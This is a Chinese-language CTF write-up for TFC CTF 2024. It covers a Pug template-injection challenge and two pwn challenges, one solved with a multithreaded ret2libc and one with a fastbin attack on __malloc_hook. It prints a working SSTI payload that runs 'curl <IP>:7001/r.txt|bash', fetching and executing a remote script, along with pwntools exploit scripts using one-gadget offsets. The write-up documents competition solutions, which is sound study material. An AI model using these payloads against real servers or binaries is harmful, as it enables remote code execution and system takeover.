---
title: TFC CTF 2024 WriteUp
contest: TFC CTF
year: 2024
team: 狼组安全社区
difficulty: medium
vuln_type: web_unknown
tags: [pug-ssti, ret2libc-multithread, fastbin-attack, password-manager, ogg]
attack_chain:
- GREETINGS: pug SSTI #{(function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 43.135.142.77:7001/r.txt|bash')})()}
- GUARD-THE-BYPASS: 多线程栈溢出 + ret2libc (ogg)
- ogg = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
- VSPM: 密码管理器 add/show/delete + 0x78 限制 + bss 指针溢出
- 构造 fake chunk size + fastbin attack 打 __malloc_hook
- libc-2.30 __malloc_hook - 0x23 + 0xb 头填充 + ogg[8]=0xe1fa1
- MCBACK2DABASICS: back2basics 入门题
key_payload: %{global.process.mainModule.constructor._load("child_process").exec('curl ip:7001/r.txt|bash')}
one_liner: TFC CTF 2024 狼组 writeup：Pug SSTI RCE + 多线程 ret2libc + fastbin attack __malloc_hook。
lesson: Pug 模板默认 sandbox 严格，但通过 #{} 表达式可逃逸到 global.process 调 native module。
quality: high
---
# TFC CTF 2024 - 狼组 WriteUp

## Web - GREETINGS
Pug 模板 SSTI:
```javascript
#{
  (function(){
    localLoad = global.process.mainModule.constructor._load;
    sh = localLoad("child_process").exec('curl 43.135.142.77:7001/r.txt|bash');
  })()
}
```
参考：https://github.com/TheWation/NodeJsSSTI

## Pwn - GUARD-THE-BYPASS
多线程栈溢出绕过 canary:
```python
from pwn import *
elf = ELF("./pwn")
io = remote("",)

rdi_ret = 0x401256
ret = 0x40101a
data = 0x404280

# 溢出 + pop rdi + puts(elf.got['getchar']) + ret to game
d = p64(data)*7 + p64(rdi_ret) + p64(elf.got['getchar']) + p64(elf.plt['puts']) + p64(elf.sym['game'])
d += ((0x850 - len(d)) // 8) * p64(data)

# 第二次覆盖返回地址 + ogg
ogg = [0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd38, 0xebd3f, 0xebd43]
getchar = u64(io.recv(6).ljust(8, b"x00"))
libc = ELF("./libcs/libc.so.6")
libc_base = getchar - libc.sym['getchar']

d = p64(data)*7
d = b"\x00" + d + p64(libc_base + ogg[5])
```

## Pwn - VSPM
密码管理器菜单 + 0x78 限制 + add 中堆块指针可溢出到 bss。

```python
def add(size, c1, c2):
    sla(b"Input: ", b"1")
    sla(b"length: ", str(size).encode())
    sa(b"Enter credentials:", c1)
    sa(b"the credentials:", c2)

# 0: 写 fake chunk header
add(0x60, p64(0)+p64(0x121), b"a")
# 1, 2, 3: 常规
add(0x60, b"B", b"b")
add(0x60, b"C"*0x48 + p64(0x21), b"c")

delete(1)  # 触发 unsorted bin
# 第二次 add(0x60) 后 fake bss 指针指向 bss+0x70
add(0x60, b"A", b"a"*0x20 + b"\x20")
delete(2)
add(0x20, b"\xc0", b"a")
# show 触发 leak

# fastbin attack 打 __malloc_hook
__malloc_hook = u64(io.recv(6).ljust(8, b"x00")) - 0x70 - 0x100
libc = ELF("./libcs/libc-2.30.so")
libc_base = __malloc_hook - libc.sym['__malloc_hook']

delete(1)
add(0x70, b"D"*0x28 + p64(0x71) + p64(__malloc_hook-0x23), b"A")
add(0x60, b"A", b"a")
ogg = [0x42e69, 0x42e7a, 0x6f821, 0x6f82f, 0x6f834, 0xc4dbf, 0xc4ddf, 0xc4de6, 0xe1fa1, 0xe1fad]
add(0x60, b"A"*0xb + p64(0) + p64(libc_base + ogg[8]), b"a")
```
